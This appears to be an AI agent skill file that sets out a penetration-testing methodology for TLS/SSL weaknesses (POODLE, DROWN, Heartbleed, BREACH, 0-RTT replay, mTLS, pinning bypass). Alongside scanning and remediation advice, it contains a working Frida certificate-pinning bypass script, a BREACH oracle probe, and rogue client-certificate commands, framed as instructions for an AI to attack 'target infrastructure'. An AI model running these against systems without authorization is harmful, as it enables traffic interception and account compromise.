---
name: offensive-tls-attacks
description: "Comprehensive methodology for auditing and exploiting TLS/SSL implementations and misconfigurations across network services and mobile applications. Covers protocol downgrade attacks including POODLE (CVE-2014-3566) against SSLv3 CBC padding, DROWN (CVE-2016-0800) cross-protocol attack leveraging SSLv2 export ciphers to decrypt TLS sessions, and FREAK (CVE-2015-0204) forcing RSA export-grade key exchange. Addresses BEAST (CVE-2011-3389) exploiting CBC IV predictability in TLS 1.0, CRIME (CVE-2012-4929) and BREACH targeting TLS-level and HTTP-level compression oracles respectively, and Heartbleed (CVE-2014-0160) for OpenSSL memory disclosure. Covers certificate validation bypass techniques for applications with improper hostname verification or chain validation, certificate pinning bypass using Frida and Objection for mobile application interception, HSTS bypass via NTP manipulation and subdomain exploitation, TLS 1.3 0-RTT replay attacks against non-idempotent endpoints, mutual TLS (mTLS) authentication attacks including client certificate theft and relay, and Certificate Transparency log monitoring for reconnaissance. Primary tooling includes testssl.sh for comprehensive TLS auditing, sslyze for Python-integrated scanning, sslscan for quick cipher enumeration, and tlsx for high-speed TLS probing at scale. Maps to CWE-295 (Improper Certificate Validation), CWE-319 (Cleartext Transmission of Sensitive Information), and CWE-757 (Selection of Less-Secure Algorithm During Negotiation)."
---

# TLS/SSL Attacks and Misconfiguration Exploitation

You are performing offensive TLS/SSL analysis against target infrastructure. This skill covers the full attack surface of transport layer security -- from protocol-level cryptographic weaknesses to implementation bugs, certificate validation failures, and deployment misconfigurations. You treat every TLS handshake as an opportunity for enumeration and every certificate chain as a trust boundary to probe.

## Quick Workflow

1. Enumerate the target's TLS configuration -- supported protocols, cipher suites, certificate chain, extensions.
2. Identify deprecated protocols (SSLv2, SSLv3, TLS 1.0, TLS 1.1) and weak cipher suites (export, NULL, RC4, DES, 3DES).
3. Check for known protocol vulnerabilities -- POODLE, DROWN, FREAK, BEAST, Heartbleed.
4. Test compression oracle exposure -- CRIME at the TLS layer, BREACH at the HTTP layer.
5. Validate certificate handling -- chain verification, hostname matching, pinning enforcement, revocation checking.
6. Assess TLS 1.3 features -- 0-RTT replay, downgrade sentinel presence, supported groups.
7. For mobile targets, bypass certificate pinning and intercept traffic.
8. Document findings with protocol evidence and remediation priorities.

---

## TLS Enumeration and Scanning

Begin every TLS engagement with comprehensive enumeration. Use testssl.sh as the primary tool -- it requires no dependencies beyond bash and OpenSSL and produces detailed output covering protocols, ciphers, vulnerabilities, and certificate details.

```bash
# Full scan with all checks, output to JSON and HTML
testssl.sh --jsonfile results.json --htmlfile results.html \
  --ip one --sneaky --warnings batch \
  target.com:443

# Quick protocol and cipher check
testssl.sh --protocols --ciphers target.com:443

# Check only for specific vulnerabilities
testssl.sh --heartbleed --ccs-injection --ticketbleed \
  --robot --poodle --beast --crime --breach --drown --freak \
  --logjam --sweet32 target.com:443

# Scan multiple targets from a file
testssl.sh --file targets.txt --parallel 10 --jsonfile bulk_results.json
```

Use sslyze for Python-integrated scanning and CI/CD pipeline integration:

```bash
# Standard scan with all plugins
sslyze --regular target.com

# JSON output for programmatic processing
sslyze --json_out results.json target.com

# Check specific vulnerability classes
sslyze --heartbleed --openssl_ccs --robot target.com

# Scan with client certificate authentication
sslyze --cert /path/to/client.pem --key /path/to/client.key target.com
```

Use sslscan for rapid cipher enumeration and tlsx for high-speed probing at scale:

```bash
# sslscan quick enumeration
sslscan --no-fallback target.com:443

# tlsx high-speed probing across many hosts
cat hosts.txt | tlsx -p 443,8443,9443 -json -o tls_results.json

# tlsx specific checks
cat hosts.txt | tlsx -san -cn -so -json  # Extract SANs, CNs, server orgs
cat hosts.txt | tlsx -tls-version tls10   # Find hosts still accepting TLS 1.0
cat hosts.txt | tlsx -expired -self-signed -mismatched  # Certificate issues
```

---

## Protocol Downgrade Attacks

Protocol downgrade attacks force a TLS connection to negotiate a weaker protocol version that has known vulnerabilities. These attacks exploit the backward-compatible fallback mechanisms built into TLS.

**POODLE (CVE-2014-3566)** exploits the non-deterministic padding in SSLv3 CBC mode. Unlike TLS, SSLv3 does not specify the padding byte values, and the receiver does not verify them -- only the padding length byte matters. This allows an active attacker to decrypt one byte of plaintext per 256 requests on average.

```bash
# Check if the target supports SSLv3
testssl.sh --poodle target.com:443
openssl s_client -ssl3 -connect target.com:443

# TLS POODLE variant: check for CBC padding oracle in TLS implementations
testssl.sh --poodle target.com:443
# Look for "POODLE, TLS" in output -- indicates vulnerable TLS implementation
```

**DROWN (CVE-2016-0800)** is a cross-protocol attack. If a server (or any server sharing the same RSA key) supports SSLv2, an attacker can decrypt passively captured TLS sessions. The attack adapts Bleichenbacher's RSA padding oracle using SSLv2 export cipher handshakes.

```bash
# Check for SSLv2 support (direct DROWN)
testssl.sh --drown target.com:443

# Check with OpenSSL (requires a build with SSLv2 enabled)
openssl s_client -ssl2 -connect target.com:443

# General DROWN also applies when another server shares the same RSA key
# Extract the certificate and search for key reuse across infrastructure
openssl s_client -connect target.com:443 </dev/null 2>/dev/null | \
  openssl x509 -noout -modulus | md5sum
# Compare this modulus hash across all servers in scope
```

**FREAK (CVE-2015-0204)** forces a downgrade to RSA_EXPORT cipher suites with 512-bit RSA keys, which are factorable in hours on commodity hardware:

```bash
# Check for export cipher support
testssl.sh --freak target.com:443
sslyze --openssl_ccs target.com

# Enumerate export ciphers directly
openssl s_client -cipher EXPORT -connect target.com:443
nmap --script ssl-enum-ciphers -p 443 target.com | grep -i export
```

---

## BEAST Attack

BEAST (CVE-2011-3389) exploits the predictable IV in TLS 1.0 CBC mode. In TLS 1.0, the IV for each record is the last ciphertext block of the previous record, making it known to an attacker who can observe the ciphertext. Combined with a chosen-plaintext capability (via JavaScript in a browser), this enables blockwise decryption of targeted bytes.

```bash
# Check for BEAST vulnerability
testssl.sh --beast target.com:443

# Verify TLS 1.0 with CBC ciphers is available
openssl s_client -tls1 -cipher 'AES128-SHA' -connect target.com:443
```

BEAST requires the attacker to inject chosen plaintext into the same TLS connection (typically via JavaScript in adjacent browser contexts). Modern mitigations include 1/n-1 record splitting (implemented in all current browsers) and upgrading to TLS 1.2+ where explicit IVs are used.

Confirm the condition: if `openssl s_client -tls1 -cipher 'ALL:!eNULL'` negotiates any CBC cipher, the connection is BEAST-eligible. Cross-reference the server's JA3S fingerprint to verify TLS 1.0 negotiation.

---

## CRIME and BREACH

**CRIME (CVE-2012-4929)** exploits TLS-level compression. When TLS compression is enabled, an attacker who can inject chosen plaintext into a request and observe the compressed ciphertext length can recover secret values (such as session cookies) one byte at a time.

```bash
# Check for TLS compression
testssl.sh --crime target.com:443
openssl s_client -connect target.com:443 | grep -i compression
# "Compression: NONE" means not vulnerable to CRIME
```

**BREACH** exploits HTTP-level compression (gzip/deflate) and is far more prevalent than CRIME because HTTP compression is almost universally enabled. The attack recovers secrets that appear in HTTP response bodies alongside attacker-reflected input.

```bash
# Check for BREACH preconditions
testssl.sh --breach target.com:443

# Manual check: verify HTTP compression is enabled
curl -sI -H "Accept-Encoding: gzip, deflate" https://target.com/ | \
  grep -i content-encoding
# "Content-Encoding: gzip" combined with reflected input + secrets in body = vulnerable
```

```python
import requests
import string

def breach_probe(url, known_prefix, charset=string.ascii_letters + string.digits):
    """
    BREACH oracle: measure compressed response length to recover secrets.
    Requires: HTTP compression enabled, secret in response body,
    attacker can inject chosen text that is reflected in the same response.
    """
    results = {}
    for c in charset:
        candidate = known_prefix + c
        # Inject candidate via a reflected parameter
        resp = requests.get(url, params={"search": candidate},
                          headers={"Accept-Encoding": "gzip"})
        # The response object's content is decompressed; use raw socket
        # or measure the actual wire bytes for a real attack.
        # Here we demonstrate the concept:
        results[c] = len(resp.content)

    # The correct byte compresses better (shorter response)
    best = min(results, key=results.get)
    return known_prefix + best

# BREACH mitigations: disable HTTP compression for pages containing secrets,
# add random padding to responses, use per-request CSRF tokens,
# separate secret-bearing responses from reflected-input responses
```

---

## Heartbleed (CVE-2014-0160)

Heartbleed is a buffer over-read in OpenSSL's TLS heartbeat extension (OpenSSL 1.0.1 through 1.0.1f). A malformed heartbeat request causes the server to return up to 64KB of process memory per request, potentially exposing private keys, session cookies, credentials, and other sensitive data.

```bash
# Test for Heartbleed
testssl.sh --heartbleed target.com:443
sslyze --heartbleed target.com

# Nmap script
nmap -p 443 --script ssl-heartbleed target.com

# Manual test with OpenSSL
# This requires a version of OpenSSL that supports the heartbeat extension
openssl s_client -connect target.com:443 -tlsextdebug 2>&1 | \
  grep -i heartbeat
```

The attack sends a TLS heartbeat request declaring a large payload length (up to 16384 bytes) but including only a single byte of actual payload. Vulnerable OpenSSL versions return the declared length from process memory. Each request leaks up to 64KB; repeated requests may expose private keys, session tokens, and credentials from different memory regions. Use the Nmap script or testssl.sh for reliable detection; for manual exploitation, existing PoC scripts (heartbleed.py variants) handle the raw TLS handshake and heartbeat framing.

---

## Certificate Validation Bypass

Applications that fail to properly validate TLS certificates create interception opportunities. Common flaws include disabled verification, missing hostname checks, accepting self-signed certificates, and incomplete chain validation.

```python
# Detect applications with disabled certificate verification
# These patterns indicate vulnerable implementations:

# Python requests - disabled verification
# requests.get(url, verify=False)

# Python urllib3 - disabled warnings indicate suppressed verification
# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Node.js - disabled TLS rejection
# process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0"

# Java - TrustAllCerts pattern
# TrustManager[] trustAllCerts = new TrustManager[] {
#     new X509TrustManager() {
#         public void checkClientTrusted(...) {}
#         public void checkServerTrusted(...) {}
#     }
# };

# cURL - insecure flag
# curl -k / curl --insecure
```

Search for these patterns in source code and configuration files during assessments:

```bash
# Search for disabled certificate verification in codebases
grep -rn "verify=False" --include="*.py" .
grep -rn "CERT_NONE" --include="*.py" .
grep -rn "NODE_TLS_REJECT_UNAUTHORIZED" --include="*.js" .
grep -rn "InsecureTrustManagerFactory" --include="*.java" .
grep -rn "TrustAllCerts\|trustAllCerts\|ALLOW_ALL" --include="*.java" .
grep -rn "AllowAllHostnameVerifier\|NoopHostnameVerifier" --include="*.java" .
grep -rn "ServerCertificateValidationCallback" --include="*.cs" .
grep -rn "InsecureSkipVerify.*true" --include="*.go" .
```

---

## Certificate Pinning Bypass

Mobile applications that implement certificate pinning require active bypass techniques for traffic interception. Use Frida and Objection for runtime instrumentation.

```bash
# Objection: automated pinning bypass for Android and iOS
# Launch the target application with Objection
objection -g com.target.app explore

# Inside the Objection REPL:
# Disable SSL pinning (covers common pinning libraries)
android sslpinning disable
# or for iOS:
ios sslpinning disable
```

```bash
# Frida: custom pinning bypass scripts

# Android: bypass OkHttp CertificatePinner
frida -U -f com.target.app -l bypass_pinning.js --no-pause

# Universal Android SSL pinning bypass with Frida
frida -U -f com.target.app --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida
```

```javascript
// bypass_pinning.js - Frida script for Android SSL pinning bypass
// Covers OkHttp, TrustManager, WebView, and common pinning libraries

Java.perform(function() {
    // Bypass OkHttp3 CertificatePinner
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List')
            .implementation = function(hostname, peerCertificates) {
            console.log('[+] OkHttp3 CertificatePinner bypassed for: ' + hostname);
            return;
        };
    } catch (e) {
        console.log('[-] OkHttp3 not found');
    }

    // Bypass custom TrustManager
    try {
        var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');

        var TrustManager = Java.registerClass({
            name: 'com.bypass.TrustManager',
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {},
                getAcceptedIssuers: function() { return []; }
            }
        });

        var TrustManagers = [TrustManager.$new()];
        var sslContext = SSLContext.getInstance('TLS');
        sslContext.init(null, TrustManagers, null);
        console.log('[+] Custom TrustManager installed');
    } catch (e) {
        console.log('[-] TrustManager bypass failed: ' + e);
    }

    // Bypass Android WebView SSL errors
    try {
        var WebViewClient = Java.use('android.webkit.WebViewClient');
        WebViewClient.onReceivedSslError.implementation = function(view, handler, error) {
            console.log('[+] WebView SSL error bypassed');
            handler.proceed();
        };
    } catch (e) {
        console.log('[-] WebViewClient bypass not applicable');
    }
});
```

```bash
# For rooted Android devices: install a system CA certificate
# Convert your proxy CA to Android format
openssl x509 -inform PEM -subject_hash_old -in proxy_ca.pem | head -1
# Rename to <hash>.0
cp proxy_ca.pem 9a5ba575.0
adb push 9a5ba575.0 /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0
```

---

## HSTS Bypass and TLS Stripping

HSTS prevents downgrade from HTTPS to HTTP, but it has inherent bootstrap and scope weaknesses.

```bash
# Check HSTS configuration
curl -sI https://target.com | grep -i strict-transport-security

# Verify HSTS preload status
# Check https://hstspreload.org/?domain=target.com

# sslstrip2 (Leonardo Nve's HSTS bypass) works by:
# 1. Stripping HTTPS links on first visit (before HSTS is cached)
# 2. Replacing domains with similar subdomains not covered by HSTS
# 3. Proxying the real HTTPS connection on the attacker side

# mitmproxy with sslstrip mode
mitmproxy --mode transparent --ssl-insecure --set block_global=false
```

HSTS bypass vectors:
- **First visit**: HSTS is trust-on-first-use. If the user has never visited the site and the site is not on the preload list, the initial HTTP request can be intercepted.
- **Subdomain scope**: `includeSubDomains` is often missing. Attack via `http://sub.target.com` even if `target.com` has HSTS.
- **NTP manipulation**: HSTS entries expire. If you can manipulate the client's clock (via NTP spoofing on the local network), cached HSTS policies can be aged out.
- **Private browsing**: Some browsers do not persist HSTS across private browsing sessions.

---

## TLS 1.3 -- 0-RTT Replay

TLS 1.3 eliminates most legacy attacks but introduces 0-RTT (Early Data) which is explicitly not replay-protected. Servers that accept 0-RTT data for non-idempotent operations are vulnerable to replay attacks.

```bash
# Check if the server accepts 0-RTT early data
openssl s_client -connect target.com:443 -tls1_3 -sess_out session.pem
openssl s_client -connect target.com:443 -tls1_3 -sess_in session.pem \
  -early_data request.txt

# testssl.sh checks for 0-RTT
testssl.sh --grease target.com:443
```

The two-step openssl test above is definitive: if the second connection succeeds and the server processes the early data file, 0-RTT is accepted. A network attacker who captures the ClientHello and early data from a legitimate connection can replay it verbatim. Target non-idempotent endpoints -- fund transfers, account modifications, order submissions -- where replay has material impact. Servers should implement anti-replay per RFC 8446 Section 8 or reject 0-RTT entirely for state-changing operations.

---

## mTLS Attacks

Mutual TLS authentication presents additional attack surfaces around client certificate handling.

```bash
# Enumerate mTLS requirements
openssl s_client -connect target.com:443 2>&1 | grep -A5 "Acceptable client"

# Test with a stolen or self-signed client certificate
openssl s_client -connect target.com:443 \
  -cert client.pem -key client.key -CAfile ca.pem

# Generate a rogue client certificate matching the expected CN/OU
openssl req -x509 -newkey rsa:2048 -keyout rogue.key -out rogue.pem \
  -days 365 -nodes \
  -subj "/CN=legitimate-service/O=Target Corp/OU=Engineering"

# Check if the server validates the issuing CA or just the certificate fields
openssl s_client -connect target.com:443 -cert rogue.pem -key rogue.key
```

Attack vectors against mTLS:
- **Missing CA validation**: Server accepts any client certificate regardless of issuer.
- **Overly broad CA trust**: Server trusts a CA that also issues certificates to unrelated parties.
- **Client certificate theft**: Extract client certificates from keystores, environment variables, CI/CD pipelines, or container images.
- **Certificate relay**: Forward client certificate challenges to a legitimate client and relay responses.

---

## Certificate Transparency Monitoring

CT logs are a reconnaissance goldmine. Every publicly trusted certificate is logged, revealing subdomains, internal hostnames, and infrastructure changes.

```bash
# Query CT logs via crt.sh
curl -s "https://crt.sh/?q=%25.target.com&output=json" | \
  python3 -c "
import json, sys
data = json.load(sys.stdin)
domains = set()
for entry in data:
    name = entry.get('name_value', '')
    for d in name.split('\n'):
        domains.add(d.strip())
for d in sorted(domains):
    print(d)
"

# Monitor for new certificates in real-time
# Use certstream for live CT log monitoring
pip install certstream

# certstream_monitor.py
python3 -c "
import certstream

def callback(message, context):
    if message['message_type'] == 'certificate_update':
        all_domains = message['data']['leaf_cert']['all_domains']
        for domain in all_domains:
            if 'target.com' in domain:
                print(f'New cert: {domain}')

certstream.listen_for_events(callback, url='wss://certstream.calidog.io/')
"
```

```bash
# Enumerate subdomains from CT logs using subfinder or amass
subfinder -d target.com -sources crtsh
amass enum -d target.com -src -ip
```

---

## Detection / Defender View

Defenders should monitor for the following indicators of TLS attacks:

- **Downgrade probes**: Connections attempting SSLv2, SSLv3, or TLS 1.0 from modern client fingerprints. A client advertising a modern TLS stack but then falling back to SSLv3 is suspicious. Log and alert on protocol version mismatches between ClientHello capabilities and the negotiated version.
- **Heartbleed scanning**: Heartbeat requests with a declared payload length larger than the actual payload. IDS signatures exist for the malformed heartbeat pattern. Monitor for repeated heartbeat requests from the same source.
- **Compression oracle probing**: Rapid sequences of requests with incrementally varying parameters to the same endpoint, combined with precise response size measurement. This pattern indicates BREACH or CRIME exploitation attempts.
- **Certificate pinning bypass**: On mobile backends, monitor for connections from known application builds that present unexpected TLS client fingerprints (JA3/JA4 hashes) -- this indicates an instrumented runtime.
- **0-RTT replay**: Monitor application logs for duplicated non-idempotent operations. Implement server-side replay caches (anti-replay mechanisms per RFC 8446 Section 8) and reject 0-RTT data for state-changing operations.
- **CT monitoring**: Defenders should proactively monitor CT logs for unauthorized certificates issued for their domains. This detects both compromised CAs and domain validation attacks.

Remediation priorities: disable SSLv2, SSLv3, TLS 1.0, and TLS 1.1 entirely; remove all export, NULL, RC4, DES, and 3DES cipher suites; deploy HSTS with `includeSubDomains` and `preload`; disable TLS compression; use TLS 1.3 as the preferred protocol; reject 0-RTT early data for non-idempotent endpoints; implement certificate pinning with backup pins and reporting; enable OCSP stapling.

---

## Engagement Cheatsheet

| Vulnerability          | Tool / Check                  | Indicator                                      |
|------------------------|-------------------------------|------------------------------------------------|
| POODLE (SSLv3)         | testssl.sh --poodle           | SSLv3 with CBC ciphers accepted                |
| DROWN (SSLv2)          | testssl.sh --drown            | SSLv2 support or shared RSA key with SSLv2 host|
| FREAK (export ciphers) | testssl.sh --freak            | RSA_EXPORT cipher suites accepted              |
| BEAST (TLS 1.0 CBC)    | testssl.sh --beast            | TLS 1.0 with CBC cipher negotiated             |
| CRIME                  | testssl.sh --crime            | TLS-level compression enabled                  |
| BREACH                 | Content-Encoding: gzip + reflection | HTTP compression + secret + reflected input |
| Heartbleed             | testssl.sh --heartbleed       | OpenSSL 1.0.1 to 1.0.1f with heartbeat ext    |
| Cert validation        | grep -rn verify=False         | Disabled verification in source code           |
| Cert pinning (mobile)  | objection / Frida             | Pin bypass allows proxy interception           |
| HSTS missing           | curl -sI + header check       | No Strict-Transport-Security header            |
| 0-RTT replay           | openssl s_client -early_data  | Server accepts and processes early data         |
| mTLS weakness          | openssl s_client -cert        | Server accepts rogue client certificates       |

Protocol version risk summary:
- SSLv2: catastrophically broken (DROWN). Must be disabled everywhere.
- SSLv3: broken (POODLE). Must be disabled everywhere.
- TLS 1.0: weak (BEAST, deprecated by RFC 8996). Disable.
- TLS 1.1: no known protocol attacks but deprecated by RFC 8996. Disable.
- TLS 1.2: secure with correct cipher suite selection (AEAD ciphers only).
- TLS 1.3: secure. Watch 0-RTT replay for non-idempotent operations.

---

## Key References

- Moller, B. et al. "This POODLE Bites: Exploiting the SSL 3.0 Fallback." Google Security Advisory, 2014.
- Aviram, N. et al. "DROWN: Breaking TLS using SSLv2." USENIX Security 2016.
- Beurdouche, B. et al. "A Messy State of the Union: Taming the Composite State Machines of TLS." IEEE S&P 2015.
- Duong, T. and Rizzo, J. "Here Come the XOR Ninjas." (BEAST) Ekoparty 2011.
- Rizzo, J. and Duong, T. "The CRIME Attack." Ekoparty 2012.
- Gluck, Y. et al. "BREACH: Reviving the CRIME Attack." Black Hat USA 2013.
- CVE-2014-0160: OpenSSL Heartbleed. https://heartbleed.com
- RFC 8446: The Transport Layer Security (TLS) Protocol Version 1.3, Section 8 (0-RTT and Anti-Replay).
- RFC 8996: Deprecating TLS 1.0 and TLS 1.1.
- CWE-295: Improper Certificate Validation.
- CWE-319: Cleartext Transmission of Sensitive Information.
- CWE-757: Selection of Less-Secure Algorithm During Negotiation.
- testssl.sh: https://testssl.sh
- sslyze: https://github.com/nabla-c0d3/sslyze
- Frida: https://frida.re
- Objection: https://github.com/sensepost/objection
